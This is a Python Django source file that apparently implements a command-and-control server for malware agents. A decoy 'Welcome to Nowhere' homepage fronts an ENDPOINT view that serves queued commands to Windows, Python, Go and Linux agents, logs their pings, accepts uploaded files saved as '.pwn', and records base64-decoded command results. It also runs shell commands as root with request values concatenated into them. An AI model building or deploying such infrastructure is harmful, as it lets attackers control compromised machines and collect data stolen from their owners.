from django.http import HttpResponse
from django.conf.urls import url
from django.core.management import call_command
import base64
import os
import datetime
from django.views.decorators.csrf import csrf_exempt


def home(request):
    return HttpResponse('''<!DOCTYPE html>
<html>
	<head>
		<title>Welcome to Nowhere</title>
		<style>
		body {
		  width: 35em;
		  margin: 0 auto;
		  font-family: Tahoma, Verdana, Arial, sans-serif;
		}
		</style>
	</head>

	<body>
		<h1>Welcome to Nowhere!</h1>
		<p>Stay on the page and lose your time</p>

		<p><em>Thank you for visiting</em></p>
	</body>
</html>

''')
@csrf_exempt
def default(request):
	mode = request.GET.get('MODE', '')

	if mode == "cmds":
		f = open("/tmp/C2CON-cmds.txt", "r")
    	
		uid = int(request.GET.get('id', ''))
		sid = str(uid)
		o = str(request.GET.get('o', ''))
    	
		if sid:
			timenow = datetime.datetime.now()
			timenow = timenow.strftime('%Y-%m-%d %H:%M:%S')
			os.setuid(0)
			os.system("chmod 666 /tmp/C2CON-temping")
			os.system("cat /tmp/C2CON-ping.txt | grep -v " + sid + " > /tmp/C2CON-temping")
			os.system("chmod 666 /tmp/C2CON-ping.txt")
			os.system("cat /tmp/C2CON-temping > /tmp/C2CON-ping.txt")
			if o ==  "W":
				cmd = "echo 'Last Ping - Agent " + sid + " (Windows) => "+ str(timenow) + "' >> /tmp/C2CON-ping.txt"
				os.system(cmd)
			if o ==  "P":
				cmd = "echo 'Last Ping - Agent " + sid + " (Python) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
				os.system(cmd)
			if o ==  "G":
				cmd = "echo 'Last Ping - Agent " + sid + " (Go) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
				os.system(cmd)
			if o ==  "L":
				cmd = "echo 'Last Ping - Agent " + sid + " (Linux) => "+ str(timenow)+ "' >> /tmp/C2CON-ping.txt"
				os.system(cmd)
    			    			    		
			return HttpResponse(f)
    	
    	
    	
    	
	if mode == "up":
		f=request.FILES['data']
		fn=request.FILES['data'].name
		baseDir = "/tmp/C2CON-uploads/"
		check = "/tmp/C2CON-uploads/' + fn + '.pwn"
		commonPrefix = os.path.commonprefix([check, baseDir])
		if commonPrefix != baseDir:
			return HttpResponse('fuck you')
		else:
			with open('/tmp/C2CON-uploads/' + fn + '.pwn', 'wb+') as destination:
				for chunk in f.chunks():
					destination.write(chunk)
			return HttpResponse('up')
    	
    	
    	
    	
    	
	if mode == "res":
		uid = int(request.GET.get('id', ''))
		sid = str(uid)
		resp = request.GET.get('RESPONSE', '')
		
		
		if resp:
			resp = resp.replace("ICAg","")
			res = base64.b64decode(resp)
			res = str(res.decode())
			res = res.replace("   ","\n")
			
			os.setuid(0)
			with open('/tmp/C2CON-res.txt', 'a') as dest:
				dest.write("Agent " + sid + " => " + res + "\n")
			
			os.system("chmod 777 /tmp/C2CON-temp")
			os.system("echo '' > /tmp/C2CON-temp")
			os.system("chmod 777 /tmp/C2CON-cmds.txt")
			os.system("cat /tmp/C2CON-cmds.txt | grep -v " + sid + " > /tmp/C2CON-temp")
			os.system("cat /tmp/C2CON-temp > /tmp/C2CON-cmds.txt")
			
		return HttpResponse('')


urlpatterns = [
    url(r'^$', home),
    url(r'^ENDPOINT$', default),
]
